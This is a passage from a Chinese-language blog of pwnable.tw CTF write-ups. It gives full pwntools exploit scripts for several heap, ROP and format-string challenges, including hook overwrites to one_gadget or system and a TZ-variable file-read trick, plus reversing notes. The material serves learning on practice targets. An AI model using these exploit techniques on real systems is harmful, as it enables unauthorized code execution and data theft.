	p.sendlineafter("Index :",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("Index :",str(idx))
#p=process("secret_of_my_heart",env={"LD_PRELOAD":"./libc_64.so.6"})
#context.log_level='debug'
p=remote("chall.pwnable.tw",10302)
add(0x100,"0")
show(0)
p.readuntil("A"*0x20)
heap=u64(p.readline()[:-1].ljust(8,"\x00"))-(0x555555757010-0x0000555555757000)
add(0x100,"1")
add(0x88,"2")
add(0x18,'3')
free(0)
free(1)
add(0x38,"0"*0x38)
add(0x88,"1")
add(0x68,"4")
free(1)
free(2)
# over lap
add(0x88)#1
show(4)
p.readuntil("Secret : ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7fbba86b2b78-0x00007fbba82ef000)
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
log.warning(hex(heap))
log.warning(hex(base))
libc=ELF("./libc_64.so.6")
libc.address=base

add(0x68,p64(0xcafebabe))#2
add(0x68,p64(0xdeadbeef))#5
free(2)
free(5)
free(4)
#context.log_level='debug'
#gdb.attach(p)
add(0x68,p64(libc.symbols['__malloc_hook']-35))#2
add(0x68,p64(0xdeadbeef))#4
add(0x68,p64(0xdeadbeef))#5
add(0x68,"\x00"*19+p64(base+0xef6c4))#6
free(2)
free(5)

p.sendline("cat /home/secret_of_my_heart/flag")
p.interactive("nier>")
```

# tcache_tear
比较简单的一题tcache...要是那天没有和小伙伴们一起出去玩...或许能拿个成就
```python
➜  Desktop checksec tcache_tear
[*] '/home/n132/Desktop/tcache_tear'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```
主要简单在没开pie而且bss上有stdout然后tcache 没有太多限制直接tcache atk就可以控制stdout
再盖掉stdout的flags和几个ptr就可以泄露libc基址然后就可以直接写掉free hook
如果对flags不太清楚的可以看下[这篇文章][4]

## exp
```python
from pwn import *
def set_name(name="A"*0x20):
	p.sendafter("Name:",name)
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(c="A"*8,size=0x88):
	cmd(1)
	p.sendlineafter("Size:",str(size))
	p.sendafter("Data:",c)
def free():
	cmd(2)
def show():
	cmd(3)
#p=process("./tcache_tear")
p=remote("chall.pwnable.tw",10207)
set_name()
add("B",0x88)
free()
free()
add(p64(0x000000000602020),0x88)
add(p64(0x000000000602020),0x88)
add('\x60',0x88)
context.log_level='debug'
add(p64(0xfbad1800)+p64(0)*3+"\x00",0x88)
p.read(8)
base=u64(p.read(8))-(0x7ffff7dd18b0-0x7ffff79e4000)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address=base
add('A',0x68)
free()
free()
add(p64(libc.symbols['__free_hook']),0x68)
add(p64(libc.symbols['__free_hook']),0x68)
add(p64(libc.symbols['system']),0x68)
add("/bin/sh",0x38)
free()
log.warning(hex(base))
#gdb.attach(p,'b *0x7ffff7aa1290')
p.interactive("nier>>")
```

# heap_paradise

全保护，漏洞点也十分明显free之后没有去清空指针.
还发现free的时候的index类型不规范导致可以填负数free任意地址但是没用上

主要的限制是add的时候不能malloc 大于0x78的chunk 导致无法使用unsorted bin获得libc
但是因为可以doublefree 所以还是很简单的
思路如下
* double free 做 overlap
* 修改chunk_head > 0x78
* free to get unsorted bin
* 利用 overlap(用over lap 比doubel free 节省1次malloc)
* partial write 盖掉stdout的flags和几个ptr leak libc(此处有1/16的概率)
* 把&__malloc_hook-35链进fast bin
* 改写__malloc_hook 为one_gadget

## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("ice:",str(c))
def add(size,data='A'):
	cmd(1)
	p.sendlineafter("Size :",str(size))
	p.sendafter("Data :",data)
def free(idx):
	cmd(2)	
	p.sendlineafter("Index :",str(idx))
p=process("./heap_paradise",env={"LD_PRELOAD":'./libc'})
#p=remote("chall.pwnable.tw",10308)
#context.log_level='debug'
add(0x68,p64(0x71)*12)#0
add(0x68,p64(0x71)*13)#1
add(0x68,p64(0x21)*13)#2
free(0)
free(1)
free(0)
add(0x68,'\x60')#3
add(0x68,'A')#4
add(0x68,'A')#5
add(0x68,p64(0xdeadbeef)+p64(0x91))#6

free(1)
add(0x68,'\xdd\x25')#7
free(0)
free(6)
free(0)
add(0x68,p64(0x71)*12+'\x70')#8
add(0x68,"A")#9
add(0x68,"A")#10
add(0x68,"\x00"*(0x43-0x10)+p64(0xfbad1800)+p64(0)*3+"\x00")#11

p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x00007ffff7a0d000)+0x1000
free(0)
free(6)
free(0)
libc=ELF('./libc')
libc.address=base
add(0x68,p64(0x71)*12+p64(libc.symbols['__malloc_hook']-35))#12
add(0x68,"A")#13
add(0x68,"\x00"*19+p64(base+0xef6c4))
log.warning(hex(base))
cmd(1)
#p.sendline("0")
p.sendline("cat /home/heap_paradise/flag")
#gdb.attach(p,'x/8gx 0x000000000202040+0x0000555555554000')
p.interactive()
```

# starbound 
一开始一直报错运行不了...找了半天[解决办法][3]
做题20分钟环境2小时
题目虽然长但是还是很友好的这种类型一般都是函数指针会出问题
果不其然可以填负数的序号，于是乎我们可以call got 或者我们自己set_name时留下的地址


主要比较麻烦的地方是没有给libc我们需要用DynELF

我们需要破坏esp找add esp xx的gadget填到name 里面然后就可以做DynELF了 

主要问题是60s的alarm...开始代码写的太烂每次超时 后来改进了一下不需要每次setname就30秒内get _flag
<比较简略...前几天写的忘记了>
```python
from pwn import *
n=0x80580D0
nop=0x8058154
write=0x8048A30
harmer=0x08048e48
repeater=0x804A605
context.arch='i386'
write=0x8048A30
read=0x8048A70
pppr=0x080494da
def cal(aim):
	if aim>nop:
		return (aim-0x8058154)/4
	else:
		return (aim-nop)/4
def cmd(c=cal(n)):
	p.sendafter("> ",str(c))#+"\xff")
def c(n=cal(n)):
	p.sendafter("> ",str(n)+"\x00")

def name(addr):
	c(6)
	c(2)
	p.sendlineafter("name: ",p32(addr))
	c(1)
def leak(addr):
	p.sendafter("> ",("-1109\x00\x00\x00"+p32(write)+p32(pppr)+p32(1)+p32(addr)+p32(0x180)+p32(repeater)).ljust(0x100,'\x00'))
	addr=p.read(0x180)
	return addr

bss=0x08058000-0x1000
binary=ELF('./starbound')
p=process("./starbound")
#p=remote("139.162.123.119",10202)
name(harmer)
p.sendafter("> ",("-33\x00"+p32(0xdeadbeef)+p32(read)+p32(pppr)+p32(0)+p32(bss)+p32(12)+p32(repeater)).ljust(0x100,'\x00'))
p.send(p32(harmer)+"/bin/sh\x00")
d=DynELF(leak,0x804A605,elf=binary)
#gdb.attach(p,'b  system')
system=d.lookup("system","libc")
log.warning(hex(system))
p.sendafter("> ","-1109\x00\x00\x00"+p32(system)+p32(0xcafebabe)+p32(bss+4))
p.sendline("cat /home/starbound/flag")
p.interactive()

```
# critical_heap
在做出来的边缘徘徊了n久....
最后看了人家的wp...发现只差临门一脚
printf居然有洞....

这题主要创建的类型有三种逆起来挺麻烦的...
```arm
00000000
00000000 node_sys        struc ; (sizeof=0x48, mappedto_9)
00000000 name            dq ?
00000008 inuse           dq ?
00000010 type            dq ?
00000018 pwd             dq ?
00000020 DIY             dq ?
00000028 Username        dq ?
00000030 Sys             dq ?
00000038 RND             dd ?
0000003C UNK             dd ?
00000040 bk              dq ?
00000048 node_sys        ends
00000048
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 tm              struc ; (sizeof=0x38, align=0x8, copyof_8)
00000000 tm_sec          dd ?
00000004 tm_min          dd ?
00000008 tm_hour         dd ?
0000000C tm_mday         dd ?
00000010 tm_mon          dd ?
00000014 tm_year         dd ?
00000018 tm_wday         dd ?
0000001C tm_yday         dd ?
00000020 tm_isdst        dd ?
00000024                 db ? ; undefined
00000025                 db ? ; undefined
00000026                 db ? ; undefined
00000027                 db ? ; undefined
00000028 tm_gmtoff       dq ?
00000030 tm_zone         dq ?                    ; offset
00000038 tm              ends
00000038
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 node_time       struc ; (sizeof=0x48, mappedto_7)
00000000 name            dq ?
00000008 inuse           dq ?
00000010 type            dq ?
00000018 local_tm        dq ?                    ; offset
00000020 year            dd ?
00000024 mon             dd ?
00000028 mday            dd ?
0000002C hour            dd ?
00000030 min             dd ?
00000034 sec             dd ?
00000038 field_38        dd ?
0000003C field_3C        dd ?
00000040 bk              dq ?
00000048 node_time       ends
00000048
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 node            struc ; (sizeof=0x48, mappedto_6)
00000000 name            dq ?
00000008 inuse           dq ?
00000010 type            dq ?                    ; offset
00000018 context         db 40 dup(?)
00000040 bk              dq ?
00000048 node            ends
00000048
```
逆向的时候发现了edit有个one_byte over flow但是想了半天没啥用...可能在高级的那题(++)里面有用
AD2019-03-03:做了高级发现没啥用因为strdu但是可以泄露栈上的内容.虽然有了后面的fmtstr就不需要这个了
```python
__strdup (const char *s)
{
  size_t len = strlen (s) + 1;
  void *new = malloc (len);
  if (new == NULL)
    return NULL;
  return (char *) memcpy (new, s, len);
}
```
```python
int edit()
{
  unsigned int v0; // eax
  signed int idx; // [rsp+Ch] [rbp-4h]

  printf("Index of heap :");
  idx = get_cmd();
  if ( idx > 9 || idx < 0 )
  {
    puts("Index error !");
    exit(2);
  }
  if ( !if_inuse[idx].name )
    return puts("No such heap !");
  printf("Name of heap:");
  v0 = strlen((const char *)array[idx].name);   // overflow
  readn((unsigned __int8 *)array[idx].name, v0);
  return puts("Done !");
}
```
* 可以用time的play获得时间...那么RND就可以被我们获得...后来证实也不需要

* 然后在逆的时候遇到了几个不懂的函数我查源码的时候有了意外的发现..
localtime()
```c
return __tz_convert (t, 1, &_tmbuf);
```

在这个页面 __tz_convert()[9] 寻找getenv居然发现__tz_convert()内的tzset_internal()调用了 tz = getenv ("TZ");
__tz_convert()
```c
__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)
{
  long int leap_correction;
  int leap_extra_secs;
  if (timer == NULL)
    {
      __set_errno (EINVAL);
      return NULL;
    }
  __libc_lock_lock (tzset_lock);
  /* Update internal database according to current TZ setting.
     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.
     This is a good idea since this allows at least a bit more parallelism.  */
  tzset_internal (tp == &_tmbuf && use_localtime);
	...
```
tzset_internal()
```c
tzset_internal (int always)
{
  static int is_initialized;
  const char *tz;
  if (is_initialized && !always)
    return;
  is_initialized = 1;
  /* Examine the TZ environment variable.  */
  tz = getenv ("TZ");
  if (tz && *tz == '\0')
	...
	__tzfile_read()
```
一开始没有啥想法..只认为是巧合但是当我点进__tzfile_read的时候
发现里面有这样一段注释
```c
/* This test is certainly a bit too restrictive but it should
           catch all critical cases.  */
```
和题目很像有没有...于是我简略理解了一下整个函数...
发现
getenv("TZDIR")
getenv("TZ")
确定TZfile...而且可能读进内存...于是我本地做了实验发现可以任意文件包含读到heap

以上可以readflag到heap了...但是没法泄露我本以为是栈上操作...搞了半天没发现一个明显的洞..
主要我以为加了chk就没有fmtstr漏洞了...
*  _printf_chk(1LL, (__int64)nd->context);
在play normal chunk里面有任意地址读漏洞...读flag就可以了....

## exp
```python
from pwn import *
context.log_level='debug'
def cmd(c):
	p.sendlineafter("choice : ",str(c))
def add(name,tp=1,ct="A"):
	cmd(1)
	p.sendafter("Name of heap:",name)
	cmd(str(tp))
	if tp==1:
		p.sendafter("Content of heap :",ct)
def show(idx):
	cmd(2)
	p.sendlineafter("heap :",str(idx))
def play(idx):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
def play_sys(idx,c=1,name="TZDIR",value='/home/critical_heap++/'):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
	cmd(c)
	if c==1:
		p.sendlineafter("Give me a name for the system heap :",name)
		p.sendlineafter("Give me a value for this name :",value)
		cmd(5)
#0x000000000604040
#p=process("./critical_heap")
p=remote("chall.pwnable.tw",10500)
add("n132",3)#0
play_sys(0,1,"TZDIR",'/home/critical_heap++/')
play_sys(0,1,"TZ","flag")
add("T",2)#1
add("nier",1,"%p%p%p%p%p|%s|")#2
play(2)
cmd(1)
p.readuntil("|")
heap=u64(p.readuntil("|")[:-1].ljust(8,'\x00'))
log.warning(hex(heap))
aim=0x605610-0x605350+heap-0x10
cmd(2)
p.sendafter("Content :","%p%p%p%p%p%p%p%p%p%p%p%p%s%p%p%p"+p64(aim))
#gdb.attach(p,"b *0x00000000040194B")
cmd(1)
p.interactive()
```

# 3x17
```python

Breakpoint 1, 0x0000000000402988 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0x2
 RBX  0x1
 RCX  0x1
 RDX  0x402960 ◂— push   rbp
 RDI  0x0
 RSI  0x0
 R8   0x7ffe4432ad17 ◂— 0x4b701800
 R9   0x0
 R10  0x495740 ◂— 0x100000000
 R11  0x246
 R12  0x4b7100 —▸ 0x4b98e0 ◂— 0x0
 R13  0x1
 R14  0x4b98e0 ◂— 0x0
 R15  0x1
 RBP  0x4b40f0 —▸ 0x401b00 ◂— cmp    byte ptr [rip + 0xb77d9], 0
 RSP  0x7ffe4432acd0 —▸ 0x7ffe4432ad30 —▸ 0x4028d0 ◂— push   r15
 RIP  0x402988 ◂— call   qword ptr [rbp + rbx*8]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x402988    call   qword ptr [rbp + rbx*8]
```
# 3x17
想破脑袋想不出...问题在exit内...现在做出来的人比较少先不放wp了..


# Breakout
挺有趣的一题 不允许 modify heap以外的空间 
远端和本地有些玄学可以试试输入无用的指令
exp就不放上来了.

# criticall_heap++

非常棒的一题.做了好几天.体验到了挖洞的乐趣...盲打的'快感'？酸爽...
记得看清提示T_T...


[1]: https://code.woboq.org/qt5/include/linux/prctl.h.html
[2]: https://n132.github.io/2018/11/15/2018-11-15-Hitcone-baby-tcache/
[3]: https://blog.csdn.net/qq_19683651/article/details/61418292
[4]: https://n132.github.io/2018/11/15/2018-11-15-Hitcone-baby-tcache/
[5]: https://n132.github.io/2019/02/11/Kidding/
[6]: https://n132.github.io/2018/11/27/2018-11-27-GETS-THE-SHELL/
[7]: https://n132.github.io/2018/11/27/2018-11-27-GETS-THE-SHELL/
[8]: https://n132.github.io/2019/02/23/mno2/
[9]: https://code.woboq.org/userspace/glibc/time/tzset.c.html#__tz_convert